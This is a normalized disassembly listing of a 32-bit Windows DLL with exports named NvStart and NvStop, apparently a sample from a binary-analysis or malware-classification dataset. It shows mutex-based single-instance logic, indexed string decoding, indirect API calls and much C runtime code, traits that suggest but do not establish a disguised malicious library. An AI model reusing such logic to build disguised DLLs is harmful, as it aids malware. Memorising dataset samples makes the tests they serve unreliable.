mov [ rw-data ] eax
test eax eax
jne r-xdata
push 0x0
lea ecx [ ebp - 0x22c ]
push ecx
push ebx
push eax
push esi
call [ rw-data ]
push esi
call [ rw-data ]
push ecx
mov ecx 0xc
call sub_10001180
mov ebx eax
mov eax [ rw-data ]
test eax eax
je r-xdata
push esi
call [ rw-data ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10002b9f
mov esp ebp
pop ebp
retn
push ecx
mov ecx 0xd
call sub_10001180
mov ecx [ rw-data ]
mov esi eax
test ecx ecx
je r-xdata
push ebx
push eax
call [ rw-data ]
mov esi eax
test esi esi
je r-xdata
push ecx
mov ecx 0xe
call sub_10001180
mov esi eax
mov eax [ rw-data ]
test eax eax
je r-xdata
push esi
push ecx
call [ rw-data ]
mov ebx eax
test ebx ebx
je r-xdata
push ebx
call [ rw-data ]
lea eax [ esi + eax * 2 ]
push r--data
push eax
mov [ rw-data ] eax
call [ rw-data ]
neg eax
sbb eax eax
and [ rw-data ] eax
mov esi [ StrStrIW@IAT ]
push r--data
push eax
call esi
test eax eax
je r-xdata
push esi
push eax
call [ rw-data ]
mov ebx eax
test ebx ebx
je r-xdata
push esi
call [ rw-data ]
lea eax [ ebx + eax * 2 ]
push r--data
push eax
mov [ rw-data ] eax
call [ rw-data ]
neg eax
sbb eax eax
and [ rw-data ] eax
test edi edi
je r-xdata
mov edi edi
mov eax [ rw-data ]
push esi
call [ rw-data ]
lea esi [ ebx + eax * 2 ]
push r--data
push esi
call [ rw-data ]
neg eax
sbb edi edi
and edi esi
xorps xmm0 xmm0
movlpd [ rw-data ] xmm0
push edi
call sub_10002d04
mov ebx eax
add esp 0x4
cmp ebx 0xffffffff
je r-xdata
xor ecx ecx
mov [ eax ] cx
push r--data
add eax 0x4
push eax
call esi
test eax eax
jne r-xdata
xor eax eax
mov [ ebp - 0x220 ] ax
mov [ ebp - 0x216 ] eax
mov [ ebp - 0x212 ] ax
mov [ ebp - 0x228 ] eax
mov [ ebp - 0x224 ] eax
lea eax [ ebp - 0x220 ]
xorps xmm0 xmm0
push eax
movq [ ebp - 0x21e ] xmm0
call [ rw-data ]
lea eax [ ebp - 0x228 ]
push eax
lea eax [ ebp - 0x220 ]
push eax
call [ rw-data ]
mov esi [ ebp - 0x228 ]
mov edi [ ebp - 0x224 ]
push 0xffffff36
push 0xd5964000
push 0x0
push ebx
call sub_100060e0
add esi eax
adc edi edx
mov [ rw-data ] esi
mov [ rw-data ] edi
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10002b9f
mov esp ebp
pop ebp
retn
NvStart
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x58
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x54 ] eax
push esi
push edi
push r--data
push 0x1
push 0x0
call [ CreateMutexW@IAT ]
push ecx
mov ecx 0xf
mov edi eax
call sub_10001180
mov esi eax
lea eax [ esi + 0x2 ]
mov dx [ esi ]
add esi 0x2
test dx dx
jne r-xdata
sub esi eax
push ecx
mov ecx 0xf
sar esi 0x1
call sub_10001180
lea ecx [ esi + esi ]
push ecx
push eax
lea eax [ esp + 0x3c ]
push eax
call sub_100077a0
add esp 0xc
push 0x1
call [ SetErrorMode@IAT ]
call [ rw-data ]
push ecx
mov ecx 0x10
mov [ rw-data ] eax
call sub_10001180
push eax
push 0x0
push 0x0
push 0x0
call [ rw-data ]
mov [ rw-data ] eax
call [ rw-data ]
cmp eax 0xb7
jne r-xdata
call sub_100025a0
mov eax [ rw-data ]
mov [ esp + 0x1c ] eax
lea eax [ esp + 0x34 ]
push 0x12c
mov edx rw-data
mov ecx 0x11
mov [ esp + 0x10 ] 0x0
mov [ esp + 0x14 ] sub_100023f0
mov [ esp + 0x18 ] 0x0
mov [ esp + 0x1c ] 0x0
mov [ esp + 0x24 ] 0x0
mov [ esp + 0x28 ] 0x0
mov [ esp + 0x2c ] 0x0
mov [ esp + 0x30 ] 0x0
mov [ esp + 0x34 ] eax
call sub_10001000
push eax
push [ rw-data ]
call [ rw-data ]
lea ecx [ esp + 0xc ]
push ecx
mov [ rw-data ] eax
call eax
test eax eax
je r-xdata
xor eax eax
pop edi
pop esi
mov ecx [ esp + 0x54 ]
xor ecx esp
call sub_10002b9f
mov esp ebp
pop ebp
retn
push 0x0
push [ rw-data ]
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ecx
mov ecx 0x12
call sub_10001180
push eax
lea eax [ esp + 0x5c ]
push eax
push 0x0
call [ rw-data ]
mov [ rw-data ] eax
test eax eax
je r-xdata
movq xmm0 [ rw-data ]
sub esp 0x10
mov eax esp
lea edx [ esp + 0x18 ]
movq [ eax ] xmm0
movq xmm0 [ rw-data ]
movq [ eax + 0x8 ] xmm0
call sub_10002480
test eax eax
je r-xdata
call sub_10002520
push [ esp + 0x8 ]
call [ rw-data ]
push [ rw-data ]
call [ rw-data ]
mov eax [ rw-data ]
test eax eax
je r-xdata
push edi
call [ CloseHandle@IAT ]
xor ecx ecx
call sub_10001570
mov ecx [ esp + 0x5c ]
mov eax [ esp + 0x14 ]
pop edi
pop esi
xor ecx esp
call sub_10002b9f
mov esp ebp
pop ebp
retn
push eax
push 0x0
push [ rw-data ]
call [ rw-data ]
NvStop
push ecx
mov ecx 0x10
call sub_10001180
push eax
push 0x0
push 0x0
push 0x0
call [ rw-data ]
mov [ rw-data ] eax
test eax eax
je r-xdata
retn
push eax
call [ rw-data ]
push [ rw-data ]
call [ rw-data ]
sub_10002ac0
push ebp
mov ebp esp
sub esp 0x8
push esi
push ecx
lea edx [ ebp - 0x4 ]
lea ecx [ ebp - 0x8 ]
mov [ ebp - 0x4 ] 0x3b4
mov [ ebp - 0x8 ] rw-data
call sub_100013a0
push ecx
lea edx [ ebp - 0x4 ]
lea ecx [ ebp - 0x8 ]
mov [ ebp - 0x4 ] 0x12c
mov [ ebp - 0x8 ] rw-data
call sub_100013a0
push ecx
xor ecx ecx
call sub_10001180
mov esi eax
lea eax [ esi + 0x2 ]
jmp r-xdata
mov cx [ esi ]
add esi 0x2
test cx cx
jne r-xdata
sub esi eax
push ecx
xor ecx ecx
sar esi 0x1
call sub_10001180
lea ecx [ esi + esi ]
push ecx
push eax
push rw-data
call sub_100077a0
add esp 0x8
mov ecx 0x1
call sub_10001180
mov esi eax
lea ecx [ esi + 0x2 ]
jmp r-xdata
mov ax [ esi ]
add esi 0x2
test ax ax
jne r-xdata
sub esi ecx
push ecx
mov ecx 0x1
sar esi 0x1
call sub_10001180
add esi esi
push esi
push eax
push rw-data
call sub_100077a0
add esp 0xc
mov ecx 0x1
call sub_10001570
dec [ ebp + 0xc ]
pop esi
mov eax 0x1
jne r-xdata
mov esp ebp
pop ebp
retn 0xc
mov ecx [ ebp + 0x8 ]
mov [ rw-data ] ecx
sub_10002bae
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0xa
mov eax [ ebp + 0x8 ]
push esi
jne r-xdata
push 0x0
push [ ebp + 0x10 ]
test eax eax
jns r-xdata
push 0x1
push 0xa
jmp r-xdata
mov esi [ ebp + 0xc ]
push esi
push eax
call sub_10002bd9
mov eax esi
pop esi
pop ebp
retn
sub_10002bd9
push ebp
mov ebp esp
cmp [ ebp + 0x14 ] 0x0
mov eax [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0xc ]
push edi
je r-xdata
mov edi esi
mov [ esi ] 0x2d
inc esi
neg eax
add dl 0x30
add dl 0x57
jmp r-xdata
xor edx edx
div [ ebp + 0x10 ]
cmp edx 0x9
jbe r-xdata
mov [ esi ] al
dec esi
mov [ esi ] dl
inc esi
test eax eax
jne r-xdata
mov al [ edi ]
mov cl [ esi ]
mov [ esi ] al
dec esi
mov [ edi ] cl
inc edi
cmp edi esi
jb r-xdata
pop edi
pop esi
pop ebp
retn 0x10
sub_10002c30
push ebp
mov ebp esp
push edi
push esi
mov edi [ ebp + 0x8 ]
mov edx edi
mov esi edi
xor eax eax
or ecx 0xffffffff
[ edi ]
cmp ecx 0xfffffffe
je r-xdata
mov eax edx
pop esi
pop edi
leave
retn
sub edi 0x2
mov ah [ esi ]
mov al [ edi ]
mov [ esi ] al
mov [ edi ] ah
add esi 0x1
sub edi 0x1
jmp r-xdata
cmp esi edi
jae r-xdata
sub_10002c90
push ebp
mov ebp esp
sub esp 0x10
jmp r-xdata
push [ ebp + 0x8 ]
call sub_100031ed
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call sub_10003387
pop ecx
test eax eax
je r-xdata
leave
retn
push 0x1
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] r--data
call sub_1000327f
push r--data
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] r--data
call sub_100033ba
int3
sub_10002cdf
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_100032bd
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_100031b5
pop ecx
sub_10002d21
push 0x8
push r--data
call sub_10004af0
mov eax [ ebp + 0xc ]
cmp eax 0x1
jne r-xdata
test eax eax
jne r-xdata
call sub_10003f50
test eax eax
jne r-xdata
cmp eax 0x2
jne r-xdata
mov eax [ rw-data ]
test eax eax
jle r-xdata
call sub_10003ade
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
cmp eax 0x3
jne r-xdata
push [ rw-data ]
call sub_100046dd
pop ecx
test eax eax
jne r-xdata
dec eax
mov [ rw-data ] eax
and [ ebp - 0x4 ] 0x0
cmp [ rw-data ] 0x0
jne r-xdata
call sub_10004aa5
call [ GetCommandLineA@IAT ]
mov [ rw-data ] eax
call sub_10004615
mov [ rw-data ] eax
call sub_10003f6d
test eax eax
jns r-xdata
call sub_10003f65
jmp r-xdata
call sub_10004b35
retn 0xc
xor eax eax
inc eax
push 0x0
call sub_1000396e
pop ecx
push 0x3bc
push 0x1
call sub_100049c6
pop ecx
pop ecx
mov esi eax
test esi esi
je r-xdata
call sub_10003bb9
mov esi [ ebp + 0x10 ]
test esi esi
jne r-xdata
call sub_10003ce5
call sub_1000426d
test eax eax
js r-xdata
call sub_10003b54
jmp r-xdata
push esi
push [ rw-data ]
call sub_100046fc
pop ecx
pop ecx
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10002e03
jmp r-xdata
call sub_1000421b
call sub_10003b54
call sub_10003f65
call sub_1000421b
jmp r-xdata
call sub_1000449a
test eax eax
js r-xdata
push esi
call sub_100031b5
pop ecx
jmp r-xdata
push 0x0
push esi
call sub_10003a2b
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
mov [ esi ] eax
or [ esi + 0x4 ] 0xffffffff
jmp r-xdata
push 0x0
call sub_10003cf4
pop ecx
test eax eax
jne r-xdata
inc [ rw-data ]
jmp r-xdata
sub_10002eb6
push 0xc
push r--data
call sub_10004af0
xor eax eax
inc eax
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
and [ ebp - 0x4 ] 0x0
cmp esi 0x1
je r-xdata
cmp [ rw-data ] esi
je r-xdata
mov ecx [ r--data ]
test ecx ecx
je r-xdata
cmp esi 0x2
jne r-xdata
xor eax eax
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push esi
push [ ebp + 0x8 ]
call ecx
mov [ ebp - 0x1c ] eax
mov ebx [ ebp + 0x10 ]
push ebx
push esi
push [ ebp + 0x8 ]
call sub_10002ac0
mov edi eax
mov [ ebp - 0x1c ] edi
cmp esi 0x1
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
push [ ebp + 0x10 ]
push esi
push [ ebp + 0x8 ]
call sub_10002d21
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
test esi esi
je r-xdata
test edi edi
jne r-xdata
push ebx
push esi
push [ ebp + 0x8 ]
call sub_10002d21
neg eax
sbb eax eax
and edi eax
mov [ ebp - 0x1c ] edi
je r-xdata
cmp esi 0x3
jne r-xdata
push ebx
push eax
push [ ebp + 0x8 ]
call sub_10002ac0
push ebx
push edi
push [ ebp + 0x8 ]
call sub_10002d21
mov eax [ r--data ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax edi
jmp r-xdata
mov eax [ r--data ]
test eax eax
je r-xdata
push ebx
push edi
push [ ebp + 0x8 ]
call eax
call sub_10004b35
retn
push ebx
push esi
push [ ebp + 0x8 ]
call eax
mov edi eax
mov [ ebp - 0x1c ] edi
sub_10002fc4
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x1
jne r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
call sub_10003819
pop ecx
pop ecx
pop ebp
retn
push [ ebp + 0x10 ]
push 0x0
push [ ebp + 0x8 ]
call sub_10002d21
sub_10002fe9
push ebp
mov ebp esp
call [ IsDebuggerPresent@IAT ]
push 0x1
mov [ rw-data ] eax
call sub_10004ce5
push [ ebp + 0x8 ]
call sub_100049b0
cmp [ rw-data ] 0x0
pop ecx
pop ecx
jne r-xdata
push 0xc0000409
call sub_1000499b
pop ecx
pop ebp
retn
push 0x1
call sub_10004ce5
pop ecx
sub_10003026
push ebp
mov ebp esp
sub esp 0x324
push 0x17
call IsProcessorFeaturePresent
test eax eax
je r-xdata
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] ebx
mov [ rw-data ] esi
mov [ rw-data ] edi
mov [ rw-data ] ss
mov [ rw-data ] cs
mov [ rw-data ] ds
mov [ rw-data ] es
mov [ rw-data ] fs
mov [ rw-data ] gs
pushfd
pop [ rw-data ]
mov eax [ ebp ]
mov [ rw-data ] eax
mov eax [ ebp + 0x4 ]
mov [ rw-data ] eax
lea eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x324 ]
mov [ rw-data ] 0x10001
mov eax [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] 0xc0000409
mov [ rw-data ] 0x1
mov [ rw-data ] 0x1
push 0x4
pop eax
imul eax eax 0x0
mov [ eax + rw-data ] 0x2
push 0x4
pop eax
imul eax eax 0x0
mov ecx [ rw-data ]
mov [ ebp + eax - 0x8 ] ecx
push 0x4
pop eax
shl eax 0x0
mov ecx [ rw-data ]
mov [ ebp + eax - 0x8 ] ecx
push r--data
call sub_10002fe9
leave
retn
push 0x2
pop ecx
int 0x29
sub_10003120
push esi
mov eax [ esp + 0x14 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x8 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x10 ]
mov ecx eax
mov eax esi
mul [ esp + 0x10 ]
add edx ecx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x14 ]
mov ecx eax
mov eax [ esp + 0x10 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x8 ]
sbb edx [ esp + 0xc ]
neg edx
neg eax
sbb edx 0x0
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
pop esi
retn 0x10
dec esi
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
cmp edx [ esp + 0xc ]
ja r-xdata
jb r-xdata
xor ebx ebx
cmp eax [ esp + 0x8 ]
jbe r-xdata
sub_100031b5
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop ebp
retn
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
test eax eax
jne r-xdata
push esi
call sub_10004d21
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_10004d34
pop ecx
mov [ esi ] eax
pop esi
sub_100031ed
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp esi 0xffffffe0
ja r-xdata
push esi
call sub_10003387
pop ecx
call sub_10004d21
mov [ eax ] 0xc
xor eax eax
push ebx
push edi
test esi esi
je r-xdata
call sub_10004d75
push 0x1e
call sub_10004dd2
push 0xff
call sub_10003ba3
xor ecx ecx
inc ecx
mov ecx esi
jmp r-xdata
mov eax edi
pop edi
pop ebx
jmp r-xdata
push 0xc
pop ebx
cmp [ rw-data ] eax
je r-xdata
push ecx
push 0x0
push eax
call [ HeapAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
pop esi
pop ebp
retn
call sub_10004d21
mov [ eax ] ebx
push esi
call sub_10003387
pop ecx
test eax eax
jne r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
jmp r-xdata
call sub_10004d21
mov [ eax ] ebx
sub_1000329a
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
and [ esi + 0x4 ] 0x0
mov [ esi ] r--data
mov [ esi + 0x8 ] 0x0
call sub_100032c8
mov eax esi
pop esi
pop ebp
retn 0x4
sub_100032c8
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp esi edi
je r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0x4
call sub_1000335e
cmp [ edi + 0x8 ] 0x0
je r-xdata
mov eax [ edi + 0x4 ]
mov [ esi + 0x4 ] eax
push [ edi + 0x4 ]
mov ecx esi
call sub_10003320
jmp r-xdata
sub_100032fb
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_1000335e
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_100031b5
pop ecx
sub_10003320
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
push ebx
mov ebx ecx
je r-xdata
pop ebx
pop ebp
retn 0x4
push edi
push [ ebp + 0x8 ]
call sub_10004ff0
lea edi [ eax + 0x1 ]
push edi
call sub_100031ed
pop ecx
pop ecx
mov [ ebx + 0x4 ] eax
test eax eax
je r-xdata
pop edi
push [ ebp + 0x8 ]
push edi
push eax
call sub_10004f8d
add esp 0xc
mov [ ebx + 0x8 ] 0x1
sub_10003387
push ebp
mov ebp esp
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0x8 ]
call eax
pop ecx
test eax eax
je r-xdata
xor eax eax
inc eax
pop ebp
retn
sub_100033ba
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
sub esp 0x20
push esi
push edi
push 0x8
pop ecx
mov esi r--data
lea edi [ ebp - 0x20 ]
[ edi ] [ esi ]
mov ecx [ ebp + 0x8 ]
pop edi
pop esi
test eax eax
je r-xdata
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
test eax eax
je r-xdata
test [ eax ] 0x10
je r-xdata
lea eax [ ebp - 0xc ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
call [ RaiseException@IAT ]
leave
retn 0x8
test [ eax ] 0x8
je r-xdata
mov eax [ ecx ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0xc ] 0x1994000
sub_10003423
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10003415
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_100031b5
pop ecx
sub_10003442
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
sub esp 0xc
test eax eax
je r-xdata
test ecx ecx
jne r-xdata
mov [ eax ] ecx
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
call sub_10004d21
mov [ eax ] 0x16
call sub_10005458
xor eax eax
leave
retn
push ebx
push esi
push edi
movzx edi [ ecx ]
xor ebx ebx
lea esi [ ecx + 0x2 ]
jmp r-xdata
cmp eax 0x2
jl r-xdata
push 0x8
push edi
call sub_10005493
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp eax 0x24
jg r-xdata
movzx edi [ esi ]
add esi 0x2
mov eax [ ebp + 0x14 ]
cmp di 0x2d
jne r-xdata
cmp di 0x2b
jne r-xdata
or eax 0x2
jmp r-xdata
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
test eax eax
jne r-xdata
movzx edi [ esi ]
add esi 0x2
cmp eax 0x10
jne r-xdata
push edi
call sub_100054e5
pop ecx
test eax eax
je r-xdata
or eax 0xffffffff
xor edx edx
div [ ebp + 0x10 ]
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] eax
push edi
call sub_100054e5
pop ecx
test eax eax
jne r-xdata
movzx eax [ esi ]
push 0x78
pop ecx
cmp ax cx
je r-xdata
mov [ ebp + 0x10 ] 0xa
jmp r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ ebp - 0x4 ]
cmp edx ecx
jae r-xdata
push 0x41
pop eax
cmp ax di
ja r-xdata
movzx eax [ esi ]
push 0x78
pop ecx
cmp ax cx
je r-xdata
push 0x10
pop eax
mov [ ebp + 0x10 ] eax
push 0x58
pop ecx
cmp ax cx
je r-xdata
mov edi [ ebp + 0xc ]
mov edi [ ebp - 0x8 ]
or eax 0x8
mov [ ebp - 0x4 ] eax
cmp ebx edi
jb r-xdata
push 0x19
lea eax [ edi - 0x61 ]
pop ecx
cmp ax cx
jbe r-xdata
cmp di 0x5a
jbe r-xdata
movzx edi [ esi + 0x2 ]
add esi 0x4
push 0x58
pop ecx
cmp ax cx
jne r-xdata
mov [ ebp + 0x10 ] 0x8
jmp r-xdata
test al 0x4
jne r-xdata
test edi edi
je r-xdata
imul ebx ecx
add ebx edx
jne r-xdata
lea eax [ edi - 0x61 ]
movzx edx di
cmp ax cx
ja r-xdata
mov eax [ ebp - 0x4 ]
push 0x19
pop ecx
call sub_10004d21
mov [ eax ] 0x22
mov eax [ ebp - 0x4 ]
test al 0x1
je r-xdata
test al 0x1
jne r-xdata
xor ebx ebx
jmp r-xdata
mov esi [ ebp + 0x8 ]
push edi
call sub_100054e5
mov edx eax
pop ecx
cmp edx 0xffffffff
jne r-xdata
mov edi [ ebp + 0xc ]
or eax 0x4
mov [ ebp - 0x4 ] eax
test edi edi
je r-xdata
cmp edx [ ebp - 0xc ]
jbe r-xdata
add edx 0xffffffc9
sub edx 0x20
push 0x0
test al 0x2
pop ebx
setne bl
add ebx 0x7fffffff
or ebx 0xffffffff
jmp r-xdata
test edi edi
je r-xdata
mov ecx eax
and ecx 0x2
je r-xdata
sub esi 0x2
test al 0x8
jne r-xdata
jmp r-xdata
test al 0x2
je r-xdata
mov [ edi ] esi
test ecx ecx
jne r-xdata
cmp ebx 0x80000000
ja r-xdata
movzx edi [ esi ]
add esi 0x2
jmp r-xdata
pop edi
pop esi
mov eax ebx
pop ebx
leave
retn
neg ebx
cmp ebx 0x7fffffff
jbe r-xdata
sub_10003636
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ ebp + 0x8 ]
mov [ esi + 0xc ] 0x0
test ecx ecx
jne r-xdata
mov eax [ ecx ]
mov [ esi ] eax
mov eax [ ecx + 0x4 ]
mov [ esi + 0x4 ] eax
call sub_100039a4
mov edx eax
mov [ esi + 0x8 ] edx
mov ecx [ edx + 0x6c ]
mov [ esi ] ecx
mov ecx [ edx + 0x68 ]
mov [ esi + 0x4 ] ecx
mov ecx [ esi ]
cmp ecx [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ rw-data ]
test [ edx + 0x70 ] eax
jne r-xdata
mov ecx [ esi + 0x8 ]
mov eax [ ecx + 0x70 ]
test al 0x2
jne r-xdata
mov ecx [ esi + 0x8 ]
mov eax [ rw-data ]
test [ ecx + 0x70 ] eax
jne r-xdata
call sub_10005909
mov [ esi ] eax
mov eax esi
pop esi
pop ebp
retn 0x4
or eax 0x2
mov [ ecx + 0x70 ] eax
mov [ esi + 0xc ] 0x1
jmp r-xdata
call sub_10005c8b
mov [ esi + 0x4 ] eax
sub_100036be
push ebp
mov ebp esp
push esi
call sub_100039bc
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov edx [ esi + 0x5c ]
push edi
mov edi [ ebp + 0x8 ]
mov ecx edx
lea eax [ edx + 0x90 ]
cmp ecx eax
jae r-xdata
add ecx 0xc
lea eax [ edx + 0x90 ]
cmp ecx eax
jb r-xdata
xor ecx ecx
cmp [ ecx ] edi
je r-xdata
cmp [ ecx ] edi
je r-xdata
xor eax eax
mov edx [ ecx + 0x8 ]
test edx edx
je r-xdata
test ecx ecx
je r-xdata
cmp edx 0x5
jne r-xdata
cmp edx 0x1
jne r-xdata
and [ ecx + 0x8 ] 0x0
xor eax eax
inc eax
jmp r-xdata
mov eax [ ebp + 0xc ]
push ebx
mov ebx [ esi + 0x60 ]
mov [ esi + 0x60 ] eax
cmp [ ecx + 0x4 ] 0x8
jne r-xdata
or eax 0xffffffff
jmp r-xdata
pop edi
push [ ecx + 0x4 ]
and [ ecx + 0x8 ] 0x0
call edx
push 0x24
pop edi
mov eax [ esi + 0x5c ]
add edi 0xc
and [ edi + eax - 0x4 ] 0x0
cmp edi 0x90
jl r-xdata
cmp [ ecx ] 0xc000008e
mov edi [ esi + 0x64 ]
jne r-xdata
cmp [ ecx ] 0xc0000090
jne r-xdata
mov [ esi + 0x64 ] 0x83
jmp r-xdata
cmp [ ecx ] 0xc0000091
jne r-xdata
mov [ esi + 0x64 ] 0x81
jmp r-xdata
push [ esi + 0x64 ]
push 0x8
call edx
pop ecx
mov [ esi + 0x64 ] edi
jmp r-xdata
cmp [ ecx ] 0xc0000093
jne r-xdata
mov [ esi + 0x64 ] 0x84
jmp r-xdata
pop ecx
mov [ esi + 0x60 ] ebx
or eax 0xffffffff
pop ebx
jmp r-xdata
cmp [ ecx ] 0xc000008d
jne r-xdata
mov [ esi + 0x64 ] 0x85
jmp r-xdata
cmp [ ecx ] 0xc000008f
jne r-xdata
mov [ esi + 0x64 ] 0x82
jmp r-xdata
cmp [ ecx ] 0xc0000092
jne r-xdata
mov [ esi + 0x64 ] 0x86
jmp r-xdata
cmp [ ecx ] 0xc00002b5
jne r-xdata
mov [ esi + 0x64 ] 0x8a
jmp r-xdata
cmp [ ecx ] 0xc00002b4
jne r-xdata
mov [ esi + 0x64 ] 0x8d
jmp r-xdata
mov [ esi + 0x64 ] 0x8e
sub_10003819
push ebp
mov ebp esp
mov eax 0xe06d7363
cmp [ ebp + 0x8 ] eax
jne r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0xc ]
push eax
call sub_100036be
pop ecx
pop ecx
pop ebp
retn
sub_10003837
push 0x8
push r--data
call sub_10004af0
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_10004b35
retn 0x4
cmp [ esi + 0x24 ] 0x0
je r-xdata
cmp [ esi + 0x2c ] 0x0
je r-xdata
push [ esi + 0x24 ]
call sub_100031b5
pop ecx
cmp [ esi + 0x34 ] 0x0
je r-xdata
push [ esi + 0x2c ]
call sub_100031b5
pop ecx
cmp [ esi + 0x3c ] 0x0
je r-xdata
push [ esi + 0x34 ]
call sub_100031b5
pop ecx
cmp [ esi + 0x40 ] 0x0
je r-xdata
push [ esi + 0x3c ]
call sub_100031b5
pop ecx
cmp [ esi + 0x44 ] 0x0
je r-xdata
push [ esi + 0x40 ]
call sub_100031b5
pop ecx
cmp [ esi + 0x48 ] 0x0
je r-xdata
push [ esi + 0x44 ]
call sub_100031b5
pop ecx
cmp [ esi + 0x5c ] r--data
je r-xdata
push [ esi + 0x48 ]
call sub_100031b5
pop ecx
push 0xd
call sub_1000507b
pop ecx
and [ ebp - 0x4 ] 0x0
mov edi [ esi + 0x68 ]
test edi edi
je r-xdata
push [ esi + 0x5c ]
call sub_100031b5
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10003959
push 0xc
call sub_1000507b
pop ecx
mov [ ebp - 0x4 ] 0x1
mov edi [ esi + 0x6c ]
test edi edi
je r-xdata
push edi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10003965
push esi
call sub_100031b5
pop ecx
push edi
call sub_1000586e
pop ecx
cmp edi [ rw-data ]
je r-xdata
cmp edi rw-data
je r-xdata
cmp edi rw-data
je r-xdata
push edi
call sub_100031b5
pop ecx
cmp [ edi ] 0x0
jne r-xdata
push edi
call sub_10005714
pop ecx
sub_1000396e
push ebp
mov ebp esp
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
pop ebp
retn
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
push 0x0
push eax
call sub_100046fc
pop ecx
pop ecx
push esi
call sub_10003837
pop esi
push eax
call sub_100046dd
mov esi eax
mov eax [ rw-data ]
pop ecx
sub_100039bc
push esi
push edi
call [ GetLastError@IAT ]
push [ rw-data ]
mov edi eax
call sub_100046dd
mov esi eax
pop ecx
test esi esi
jne r-xdata
push edi
call [ SetLastError@IAT ]
pop edi
mov eax esi
pop esi
retn
push 0x3bc
push 0x1
call sub_100049c6
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
call sub_100046fc
pop ecx
pop ecx
test eax eax
je r-xdata
push esi
call sub_100031b5
pop ecx
xor esi esi
push 0x0
push esi
call sub_10003a2b
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
